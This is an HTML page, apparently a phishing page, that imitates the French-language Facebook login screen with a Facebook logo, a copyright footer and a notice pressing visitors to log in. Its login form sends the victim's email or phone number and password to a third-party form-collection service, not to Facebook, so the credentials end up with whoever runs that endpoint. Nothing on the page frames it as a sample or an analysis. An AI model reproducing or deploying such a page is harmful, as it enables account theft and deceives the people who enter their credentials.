<html lang="fr">
 <head> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1"> 
  <link rel="shortcut icon" type="https://i.ibb.co/mzfzWwB/t-l-chargement-2.png" href="https://i.ibb.co/mzfzWwB/t-l-chargement-2.png"> 
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous"> 
  <title>Log into Facebook</title> 
 </head> 
 <body> 
  <style>
        .form-control-lg::-webkit-input-placeholder {
            color: #c6c8cc;
            font-size: 17px;
        }

    </style> 
  <div class="alert alert-warning" style="background-color: #FFFBE2">
   <small><strong>Veuillez noter:</strong> Vous n'êtes actuellement pas connecté, veuillez continuer avec Votre compte pour afficher la page suivante !</small>
  </div> 
  <div class="container-fluid"> 
   <div class="row"> 
    <center> 
     <div class="col-lg-3 col-md-6 col-sm-6 my-4 col-xs-10"> 
      <center>
       <img src="https://i.ibb.co/mzfzWwB/t-l-chargement-2.png" class="img-fluid" width="25%" style="max-width:250px;">
      </center> 
      <div class="card px-2 border-0"> 
       <div class="card-body"> 
        <form action="https://formcarry.com/s/w2V8kq4VCEA" method="POST" accept-charset="UTF-8" >
         <div class="mb-3"> 
          <input type="text" class="form-control form-control-lg" style="background-color: #F5F6F7;" id="email" name="email" placeholder="Numéro de mobile ou email"> 
         </div> 
         <div class="mb-3"> 
          <input type="password" class="form-control form-control-lg" style="background-color: #F5F6F7;" id="password" name="password" placeholder="Mot de passe"> 
         </div> 
         <div class="d-grid gap-2"> 
          <button class="btn btn-primary btn-lg" type="submit"><strong>Se connecter</strong></button> 
         </div> 
        </form> 
       </div> 
      </div> 
     </div> 
    </center> 
    <hr> 
   </div> 
   <br> 
   <center>
    <small class="text-secondary">©2021 Facebook</small>
   </center> 
  </div> 
 </body>
</html>
